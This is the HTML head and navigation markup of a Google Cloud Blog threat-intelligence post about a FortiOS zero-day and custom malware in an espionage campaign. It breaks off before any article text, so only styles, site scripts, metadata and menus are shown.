Display';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBkXYtB_7TKx9.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBkXYtB77TKx9.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBkXYtBD7TA.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style><script nonce="wC8mBVAL5Ft29iPueo1EIg">(function(){'use strict';function d(){var a=g,b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}};/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
var k=this||self;/*

 Copyright 2024 Google, Inc
 SPDX-License-Identifier: MIT
*/
var l=["focus","blur","error","load","toggle"];function m(a){return a==="mouseenter"?"mouseover":a==="mouseleave"?"mouseout":a==="pointerenter"?"pointerover":a==="pointerleave"?"pointerout":a};function n(a){this.l={};this.m={};this.i=null;this.g=[];this.o=a}n.prototype.handleEvent=function(a,b,c){q(this,{eventType:a,event:b,targetElement:b.target,eic:c,timeStamp:Date.now(),eia:void 0,eirp:void 0,eiack:void 0})};function q(a,b){if(a.i)a.i(b);else{b.eirp=!0;var c;(c=a.g)==null||c.push(b)}}
function r(a,b,c){if(!(b in a.l)&&a.o){var f=function(e,p,B){a.handleEvent(e,p,B)};a.l[b]=f;c=m(c||b);if(c!==b){var h=a.m[c]||[];h.push(b);a.m[c]=h}a.o.addEventListener(c,function(e){return function(p){f(b,p,e)}})}}n.prototype.j=function(a){return this.l[a]};n.prototype.ecrd=function(a){this.i=a;var b;if((b=this.g)==null?0:b.length){for(a=0;a<this.g.length;a++)q(this,this.g[a]);this.g=null}};var t=typeof navigator!=="undefined"&&/iPhone|iPad|iPod/.test(navigator.userAgent);function u(a){this.g=a;this.i=[]}u.prototype.addEventListener=function(a,b){t&&(this.g.style.cursor="pointer");var c=this.i,f=c.push,h=this.g;b=b(this.g);var e=!1;l.indexOf(a)>=0&&(e=!0);h.addEventListener(a,b,e);f.call(c,{eventType:a,j:b,capture:e})};var g="click dblclick focus focusin blur error focusout keydown keyup keypress load mouseover mouseout mouseenter mouseleave submit toggle touchstart touchend touchmove touchcancel auxclick change compositionstart compositionupdate compositionend beforeinput input select textinput copy cut paste mousedown mouseup wheel contextmenu dragover dragenter dragleave drop dragstart dragend pointerdown pointermove pointerup pointercancel pointerenter pointerleave pointerover pointerout gotpointercapture lostpointercapture ended loadedmetadata pagehide pageshow visibilitychange beforematch".split(" ");
if(!(g instanceof Array)){var v;var w=typeof Symbol!="undefined"&&Symbol.iterator&&g[Symbol.iterator];if(w)v=w.call(g);else if(typeof g.length=="number")v={next:d()};else throw Error(String(g)+" is not an iterable or ArrayLike");for(var x,y=[];!(x=v.next()).done;)y.push(x.value)};var z=function(a){return{trigger:function(b){var c=a.j(b.type);c||(r(a,b.type),c=a.j(b.type));var f=b.target||b.srcElement;c&&c(b.type,b,f.ownerDocument.documentElement)},configure:function(b){b(a)}}}(function(){var a=window,b=new u(a.document.documentElement),c=new n(b);g.forEach(function(e){return r(c,e)});var f,h;"onwebkitanimationend"in a&&(f="webkitAnimationEnd");r(c,"animationend",f);"onwebkittransitionend"in a&&(h="webkitTransitionEnd");r(c,"transitionend",h);return{s:c,u:b}}().s),A=["BOQ_wizbind"],
C=window||k;A[0]in C||typeof C.execScript=="undefined"||C.execScript("var "+A[0]);for(var D;A.length&&(D=A.shift());)A.length||z===void 0?C[D]&&C[D]!==Object.prototype[D]?C=C[D]:C=C[D]={}:C[D]=z;}).call(this);
</script><script noCollect src="https://www.gstatic.com/_/mss/boq-cloudx-web-blog/_/js/k=boq-cloudx-web-blog.TransformBlogUi.en_US.1i9-kuduzZ8.es5.O/am=OBgwCw/d=1/excm=_b,_tp,articleview/ed=1/dg=0/wt=2/ujg=1/rs=AHrnUqUMvlEHr94IN6yx4SpmHpWQIBRpsQ/m=_b,_tp" defer id="base-js" fetchpriority="high" nonce="wC8mBVAL5Ft29iPueo1EIg"></script><script nonce="wC8mBVAL5Ft29iPueo1EIg">if (window.BOQ_loadedInitialJS) {onJsLoad();} else {document.getElementById('base-js').addEventListener('load', onJsLoad, false);}</script><script nonce="wC8mBVAL5Ft29iPueo1EIg">
    window['_wjdc'] = function (d) {window['_wjdd'] = d};
    </script><title>Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation | Google Cloud Blog</title><meta name="description" content="A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign."><meta name="robots" content="max-image-preview:large"><meta property="og:title" content="Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation | Google Cloud Blog"><meta property="og:type" content="website"><meta property="og:url" content="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem"><meta property="og:image" content="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png"><meta property="og:description" content="A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign."><meta property="og:site_name" content="Google Cloud Blog"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem"><meta name="twitter:title" content="Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation | Google Cloud Blog"><meta name="twitter:description" content="A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign."><meta name="twitter:image" content="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png"><meta name="twitter:site" content="@googlecloud"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem","headline":"Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation","description":"A suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign.","image":"https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png","author":[{"@type":"Person","name":"Mandiant ","url":""}],"datePublished":"2023-03-16","publisher":{"@type":"Organization","name":"Google Cloud","logo":{"@type":"ImageObject","url":"https://www.gstatic.com/devrel-devsite/prod/v8bb8fa0afe9a8c3a776ebeb25d421bb443344d789b3607754dfabea418b8c4be/cloud/images/cloud-logo.svg"}},"url":"https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem","keywords":["Threat Intelligence","Security \u0026 Identity"],"timeRequired":"PT42M"}</script><link rel="canonical" href="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem/"><meta name="track-metadata-page_post_title" content="Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation"><meta name="track-metadata-page_post_labels" content="Threat Intelligence"><meta name="track-metadata-page_first_published" content="2024-03-25 18:03:00"><meta name="track-metadata-page_last_published" content="2023-03-16 00:03:00"><meta name="track-metadata-page_post_author" content="Mandiant "><meta name="track-metadata-page_post_author_role" content=""><header jsaction="rcuQ6b:npT2md" jscontroller="o60eef" class="glue-header nRhiJb-tJHJj-OWXEXe-kFx1Ae" id="kO001e"><a href="./#content" class="glue-header__link glue-header__skip-content">Jump to Content</a><div class="glue-header__bar glue-header__bar--mobile DFb9Jf" track-metadata-module="header"><div class="nRhiJb-mb9u9d"><div class="glue-header__container JF2WI"><div class="nRhiJb-o2XRw-yHKmmc lUwpmd"><div class="nRhiJb-rSCjMe"><a class="nRhiJb-rSCjMe-hSRGPd" href="https://cloud.google.com/" title="Google Cloud" track-name="google cloud"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/"track-metadata-module="header"><div class="nRhiJb-rSCjMe-haAclf"><svg class="glue-header__logo-svg" viewBox="0 0 74 24" role="presentation" aria-hidden="true"><path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"></path><path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"></path><path fill="#4285F4" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"></path><path fill="#FBBC05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"></path><path fill="#34A853" d="M58 .24h2.51v17.57H58z"></path><path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"></path></svg></div><span class="nRhiJb-rSCjMe-OWXEXe-UBMNlb khBwGd">Cloud</span></a></div></div><div class="glue-header__hamburger s6BfRd"><button class="glue-header__drawer-toggle-btn" aria-label="Open the navigation drawer"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg></button></div><div class="nRhiJb-o2XRw-yHKmmc UrjqX"><div class="nRhiJb-rSCjMe"><a class="nRhiJb-rSCjMe-hSRGPd" href="https://cloud.google.com/blog" title="Google Cloud Blog" track-name="blog"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog"track-metadata-module="header"><span class="nRhiJb-rSCjMe-OWXEXe-UBMNlb khBwGd">Blog</span></a></div></div></div><div class="glue-header__container ca6rub"><div class="nRhiJb-GUI8l"><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-pSzOP-o6Shpd " href="https://cloud.google.com/contact/" track-name="contact sales"track-type="blog nav"track-metadata-eventdetail="cloud.google.com/contact/"track-metadata-module="header" track-name="contact sales"track-type="button"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/contact/">Contact sales </a><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-CNusmb-o6Shpd " href="https://console.cloud.google.com/freetrial/" track-name="get started for free"track-type="blog nav"track-metadata-eventdetail="console.cloud.google.com/freetrial/"track-metadata-module="header" track-name="get started for free"track-type="button"track-metadata-position="nav"track-metadata-eventdetail="console.cloud.google.com/freetrial/">Get started for free </a></div><div class="GKI4ub"><div class="Jhiezd"><form action="/blog/search/" class="A2C6Ob"><input class="BAhdXd" jsname="oJAbI" name="query" type="text" placeholder="Find an article..."><input type="hidden" name="language" value=en hidden><input type="hidden" name="category" value=article hidden><input type="hidden" name="paginate" value="25" hidden><input type="hidden" name="order" value="newest" hidden><input type="hidden" name="hl" value=en hidden><span class="A0lwXc" jsname="D8MWrd" aria-label="Show the search input field." role="button" jsaction="click:jUF4E"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c" viewBox="0 0 24 24" role="presentation" aria-hidden="true" width="40" height="22"><path d="M20.49 19l-5.73-5.73C15.53 12.2 16 10.91 16 9.5A6.5 6.5 0 1 0 9.5 16c1.41 0 2.7-.47 3.77-1.24L19 20.49 20.49 19zM5 9.5C5 7.01 7.01 5 9.5 5S14 7.01 14 9.5 11.99 14 9.5 14 5 11.99 5 9.5z"></path></svg></span></form></div></div></div></div></div><div class="glue-header__bar glue-header__bar--desktop glue-header__drawer YcctDe" track-metadata-module="header"><div class="nRhiJb-mb9u9d M7RUq"><div class="glue-header__container JF2WI"><div class="nRhiJb-o2XRw-yHKmmc lUwpmd"><div class="nRhiJb-rSCjMe"><a class="nRhiJb-rSCjMe-hSRGPd" href="https://cloud.google.com/" title="Google Cloud" track-name="google cloud"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/"track-metadata-module="header"><div class="nRhiJb-rSCjMe-haAclf"><svg class="glue-header__logo-svg" viewBox="0 0 74 24" role="presentation" aria-hidden="true"><path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"></path><path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"></path><path fill="#4285F4" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"></path><path fill="#FBBC05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"></path><path fill="#34A853" d="M58 .24h2.51v17.57H58z"></path><path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"></path></svg></div><span class="nRhiJb-rSCjMe-OWXEXe-UBMNlb khBwGd">Cloud</span></a></div></div><div class="nRhiJb-o2XRw-yHKmmc UrjqX"><div class="nRhiJb-rSCjMe"><a class="nRhiJb-rSCjMe-hSRGPd" href="https://cloud.google.com/blog" title="Google Cloud Blog" track-name="blog"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog"track-metadata-module="header"><span class="nRhiJb-rSCjMe-OWXEXe-UBMNlb khBwGd">Blog</span></a></div></div></div><div class="glue-header__container glue-header__stepped-nav LKvi8b" role="navigation"><div class="glue-header__stepped-nav-controls-container"><div class="glue-header__stepped-nav-controls"><div class="glue-header__stepped-nav-controls-arrow"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M16.41 5.41L15 4l-8 8 8 8 1.41-1.41L9.83 12"></path></svg><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G glue-header__stepped-nav-subnav-icon" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M7.59 18.59L9 20l8-8-8-8-1.41 1.41L14.17 12"></path></svg></div><div class="glue-header__stepped-nav-controls-title glue-header__link"></div></div></div><div class="glue-header__stepped-nav-menus"></div></div><div class="glue-header__container nRhiJb-J6KYL-OWXEXe-Q4irje"><nav class="glue-header__link-bar"><ul class="glue-header__list glue-header__list--nested glue-header__deep-nav URiJfb"><li class="glue-header__item "><a class="glue-header__link">Solutions &amp; technology<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M5.41 7.59L4 9l8 8 8-8-1.41-1.41L12 14.17"></path></svg></a><ul class="glue-header__list NDdrcc"><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/ai-machine-learning" track-name="ai &amp; machine learning"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/ai-machine-learning"track-metadata-module="header"><span>AI &amp; Machine Learning</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/api-management" track-name="api management"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/api-management"track-metadata-module="header"><span>API Management</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/application-development" track-name="application development"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/application-development"track-metadata-module="header"><span>Application Development</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/application-modernization" track-name="application modernization"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/application-modernization"track-metadata-module="header"><span>Application Modernization</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/chrome-enterprise" track-name="chrome enterprise"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/chrome-enterprise"track-metadata-module="header"><span>Chrome Enterprise</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/compute" track-name="compute"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/compute"track-metadata-module="header"><span>Compute</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/containers-kubernetes" track-name="containers &amp; kubernetes"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/containers-kubernetes"track-metadata-module="header"><span>Containers &amp; Kubernetes</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/data-analytics" track-name="data analytics"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/data-analytics"track-metadata-module="header"><span>Data Analytics</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/databases" track-name="databases"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/databases"track-metadata-module="header"><span>Databases</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/devops-sre" track-name="devops &amp; sre"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/devops-sre"track-metadata-module="header"><span>DevOps &amp; SRE</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/maps-geospatial" track-name="maps &amp; geospatial"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/maps-geospatial"track-metadata-module="header"><span>Maps &amp; Geospatial</span></a></li><li class="glue-header__item "><a class="glue-header__link janap">Security<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M7.59 18.59L9 20l8-8-8-8-1.41 1.41L14.17 12"></path></svg></a><ul class="glue-header__list NDdrcc"><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/identity-security" track-name="security &amp; identity"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/identity-security"track-metadata-module="header"><span>Security &amp; Identity</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/threat-intelligence" track-name="threat intelligence"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence"track-metadata-module="header"><span>Threat Intelligence</span></a></li></ul></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/infrastructure" track-name="infrastructure"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/infrastructure"track-metadata-module="header"><span>Infrastructure</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/infrastructure-modernization" track-name="infrastructure modernization"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/infrastructure-modernization"track-metadata-module="header"><span>Infrastructure Modernization</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/networking" track-name="networking"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/networking"track-metadata-module="header"><span>Networking</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/productivity-collaboration" track-name="productivity &amp; collaboration"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/productivity-collaboration"track-metadata-module="header"><span>Productivity &amp; Collaboration</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/sap-google-cloud" track-name="sap on google cloud"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/sap-google-cloud"track-metadata-module="header"><span>SAP on Google Cloud</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/storage-data-transfer" track-name="storage &amp; data transfer"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/storage-data-transfer"track-metadata-module="header"><span>Storage &amp; Data Transfer</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/sustainability" track-name="sustainability"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/sustainability"track-metadata-module="header"><span>Sustainability</span></a></li></ul></li><li class="glue-header__item "><a class="glue-header__link">Ecosystem<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M5.41 7.59L4 9l8 8 8-8-1.41-1.41L12 14.17"></path></svg></a><ul class="glue-header__list NDdrcc"><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/transform" track-name="it leaders"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/transform"track-metadata-module="header"><span>IT Leaders</span></a></li><li class="glue-header__item "><a class="glue-header__link janap">Industries<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M7.59 18.59L9 20l8-8-8-8-1.41 1.41L14.17 12"></path></svg></a><ul class="glue-header__list NDdrcc"><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/financial-services" track-name="financial services"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/financial-services"track-metadata-module="header"><span>Financial Services</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/healthcare-life-sciences" track-name="healthcare &amp; life sciences"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/healthcare-life-sciences"track-metadata-module="header"><span>Healthcare &amp; Life Sciences</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/manufacturing" track-name="manufacturing"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/manufacturing"track-metadata-module="header"><span>Manufacturing</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/products/media-entertainment" track-name="media &amp; entertainment"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/products/media-entertainment"track-metadata-module="header"><span>Media &amp; Entertainment</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/public-sector" track-name="public sector"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/public-sector"track-metadata-module="header"><span>Public Sector</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/retail" track-name="retail"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/retail"track-metadata-module="header"><span>Retail</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/supply-chain-logistics" track-name="supply chain"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/supply-chain-logistics"track-metadata-module="header"><span>Supply Chain</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/telecommunications" track-name="telecommunications"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/telecommunications"track-metadata-module="header"><span>Telecommunications</span></a></li></ul></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/partners" track-name="partners"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/partners"track-metadata-module="header"><span>Partners</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/startups" track-name="startups &amp; smb"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/startups"track-metadata-module="header"><span>Startups &amp; SMB</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/training-certifications" track-name="training &amp; certifications"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/training-certifications"track-metadata-module="header"><span>Training &amp; Certifications</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/inside-google-cloud" track-name="inside google cloud"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/inside-google-cloud"track-metadata-module="header"><span>Inside Google Cloud</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://cloud.google.com/blog/topics/google-cloud-next" track-name="google cloud next &amp; events"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/google-cloud-next"track-metadata-module="header"><span>Google Cloud Next &amp; Events</span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://mapsplatform.google.com/resources/blog/" track-name="google maps platform"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="mapsplatform.google.com/resources/blog/"track-metadata-module="header" target="_blank"><span>Google Maps Platform<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G FsOzib nRhiJb-tHaKme-AipIyc" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="m8.9 16.075 